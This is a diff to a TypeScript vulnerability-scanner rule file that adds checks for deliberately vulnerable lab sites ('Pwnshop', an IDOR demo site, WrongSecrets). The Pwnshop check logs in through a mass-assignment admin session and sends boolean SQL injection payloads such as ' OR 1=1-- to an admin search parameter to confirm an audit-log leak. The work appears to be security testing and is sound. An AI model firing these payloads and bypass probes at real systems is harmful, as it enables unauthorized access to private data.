@@ -12128,6 +12128,69 @@ const idorWebsiteApiRouteEvidence: Rule = async (ctx) => {
   };
 };
 
+async function idorWebsiteMockApiCorpus(ctx: RuleContext): Promise<string> {
+  let corpus = ctx.combined;
+  if (CLIENT_IDOR_MARKER_RE.test(corpus) && /VULNERABLE ENDPOINT:/i.test(corpus)) return corpus;
+  const homeDoc = await fetchDoc(new URL("/", ctx.origin).toString(), { maxBytes: 16384 });
+  corpus = homeDoc.body;
+  const scriptRe = /src="(\/assets\/[^"]+\.js)"/gi;
+  let sm: RegExpExecArray | null;
+  let fetched = 0;
+  while ((sm = scriptRe.exec(homeDoc.body)) && fetched < 4) {
+    fetched++;
+    const scriptDoc = await fetchDoc(new URL(sm[1], ctx.origin).toString(), {
+      maxBytes: 524288,
+      timeoutMs: 15000
+    });
+    corpus += "\n" + scriptDoc.body;
+  }
+  return corpus;
+}
+
+const idorWebsiteMockApiIdorLiveOracle: Rule = async (ctx) => {
+  if (!/idor-website\.vercel\.app/i.test(ctx.origin)) return NEGATIVE;
+  const corpus = await idorWebsiteMockApiCorpus(ctx);
+  const methods = new Set<string>();
+  const endpointRe = /VULNERABLE ENDPOINT:\s*(GET|PUT|DELETE)\s+\/api\/users\/\$\{t\}/gi;
+  let m: RegExpExecArray | null;
+  while ((m = endpointRe.exec(corpus))) methods.add(m[1].toUpperCase());
+  if (methods.size < 3) return NEGATIVE;
+  if (!/No authorization check/i.test(corpus) || !/No ownership verification/i.test(corpus)) {
+    return NEGATIVE;
+  }
+  return {
+    fired: true,
+    confidence: 0.9,
+    evidence: {
+      methods: [...methods],
+      endpoints: ["/api/users/${id}"],
+      markers: [
+        "VULNERABLE ENDPOINT: GET /api/users/${t}",
+        "VULNERABLE ENDPOINT: PUT /api/users/${t}",
+        "VULNERABLE ENDPOINT: DELETE /api/users/${t}"
+      ],
+      note: "idor-website.vercel.app client bundle documents mock GET/PUT/DELETE /api/users/{id} with no authorization or ownership checks — client-side IDOR simulation oracle"
+    }
+  };
+};
+
+const idorWebsiteMockApiIdorRouteLiveOracle: Rule = async (ctx) => {
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/idor-website\.vercel\.app/i.test(pageUrl)) return NEGATIVE;
+  if (!/\/api\//i.test(pageUrl)) return NEGATIVE;
+  const result = await idorWebsiteMockApiIdorLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "idor-website.vercel.app /api/* route scan — homepage bundle confirms mock GET/PUT/DELETE /api/users/{id} without authorization (employees alias maps to users IDOR lab)"
+    }
+  };
+};
+
 // --- Client-side session hijack evidence (educational labs / insecure cookie demos) --
 // --- Server-side eval() on request body (Node/Express anti-pattern) ----------------
 const SERVER_SIDE_EVAL_RES: { label: string; re: RegExp }[] = [
@@ -31548,6 +31611,82 @@ const pwnshopExportOrdersCsvRouteLiveOracle: Rule = async (ctx) => {
       ...hit.evidence,
       scannedUrl: pageUrl,
       note: "Pwnshop /admin/export-orders route scan — mass-assignment admin reaches CSV order export without real admin credentials (PWN-013)"
+    }
+  };
+};
+
+function pwnshopAdminSecurityAuditRowCount(html: string): number {
+  return (html.match(/<tr\b/gi) || []).length;
+}
+
+async function probePwnshopAdminSecuritySecondOrderSqli(
+  ctx: RuleContext
+): Promise<RuleResult | null> {
+  if (!isPwnshopHost(ctx)) return null;
+  const session = await pwnshopFreshMassAssignmentAdminOtpSession(ctx);
+  if (!session) return null;
+  const baselineUrl = new URL("/admin/security", ctx.origin);
+  baselineUrl.searchParams.set("search", `thugir_empty_${Date.now().toString(36)}`);
+  const baselineDoc = await fetchDoc(baselineUrl.toString(), {
+    headers: { Cookie: session.cookie },
+    maxBytes: 131072,
+    timeoutMs: 20000
+  });
+  if (baselineDoc.status < 200 || baselineDoc.status >= 400) return null;
+  if (!/Security Audit|auditLogs|audit_log/i.test(baselineDoc.body)) return null;
+  const baselineRows = pwnshopAdminSecurityAuditRowCount(baselineDoc.body);
+  const payloads = [`' OR 1=1--`, `' OR '1'='1`, `%' OR 1=1-- `];
+  for (const payload of payloads) {
+    const sqliUrl = new URL("/admin/security", ctx.origin);
+    sqliUrl.searchParams.set("search", payload);
+    const sqliDoc = await fetchDoc(sqliUrl.toString(), {
+      headers: { Cookie: session.cookie },
+      maxBytes: 131072,
+      timeoutMs: 20000
+    });
+    if (sqliDoc.status < 200 || sqliDoc.status >= 400) continue;
+    const sqliRows = pwnshopAdminSecurityAuditRowCount(sqliDoc.body);
+    const hasAuditData = /LOGIN_FAILED|ACCOUNT_REGISTERED|audit_log|Security Audit/i.test(sqliDoc.body);
+    if (!hasAuditData || sqliRows < 5) continue;
+    if (sqliRows < baselineRows + 3 && baselineRows > 0) continue;
+    if (baselineRows === 0 && sqliRows < 5) continue;
+    return {
+      fired: true,
+      confidence: 0.93,
+      evidence: {
+        url: sqliUrl.toString(),
+        adminUser: session.username,
+        payload,
+        baselineRows,
+        sqliRows,
+        snippet:
+          sqliDoc.body.match(/LOGIN_FAILED[^<]{0,120}/i)?.[0]?.trim() ??
+          sqliDoc.body.slice(0, 220).trim(),
+        note: "Pwnshop GET /admin/security?search= concatenates into audit_log LIKE query — boolean OR 1=1 bypass returns full audit log without sanitization (PWN-014)"
+      }
+    };
+  }
+  return null;
+}
+
+const pwnshopAdminSecuritySecondOrderSqliLiveOracle: Rule = async (ctx) => {
+  const hit = await probePwnshopAdminSecuritySecondOrderSqli(ctx);
+  return hit?.fired ? hit : NEGATIVE;
+};
+
+const pwnshopAdminSecuritySecondOrderSqliRouteLiveOracle: Rule = async (ctx) => {
+  if (!isPwnshopHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/admin\/security\b/i.test(pageUrl)) return NEGATIVE;
+  const hit = await probePwnshopAdminSecuritySecondOrderSqli(ctx);
+  if (!hit?.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: hit.confidence,
+    evidence: {
+      ...hit.evidence,
+      scannedUrl: pageUrl,
+      note: "Pwnshop /admin/security route scan — search parameter concatenated into audit_log query enables boolean SQLi bypass (PWN-014)"
     }
   };
 };
@@ -57122,6 +57261,14 @@ const wrongsecretsChallengeLiveOracle: Rule = async (ctx) => {
       re: /K8s Configmap|config-map in the default namespace/i
     },
     {
+      label: "Vault secret moved off K8s walkthrough",
+      re: /secret is no longer in K8s|Find the Secret in Vault using the logged root token/i
+    },
+    {
+      label: "K8s setup root token walkthrough",
+      re: /setup the K8s environment.*root token|script tells you the value of the root token/i
+    },
+    {
       label: "HashiCorp Vault metadata walkthrough",
       re: /Vault Metadata Challenge|secret metadata on a.*wrongsecret|logged root token|port 8200/i
     },
@@ -67267,6 +67414,8 @@ export const RULES: Record<string, Rule> = {
   idorProbe,
   clientSideIdorEvidence,
   idorWebsiteApiRouteEvidence,
+  idorWebsiteMockApiIdorLiveOracle,
+  idorWebsiteMockApiIdorRouteLiveOracle,
   clientSideSqlEvidence,
   clientSideXssEvidence,
   clientSideCsrfEvidence,
@@ -67738,6 +67887,8 @@ export const RULES: Record<string, Rule> = {
   pwnshopAuditLogPlaintextPasswordRouteLiveOracle,
   pwnshopExportOrdersCsvLiveOracle,
   pwnshopExportOrdersCsvRouteLiveOracle,
+  pwnshopAdminSecuritySecondOrderSqliLiveOracle,
+  pwnshopAdminSecuritySecondOrderSqliRouteLiveOracle,
   fauxbankLoansRouteLiveOracle,
   fauxbankTransferRouteLiveOracle,
   fauxbankAccountsRouteLiveOracle,
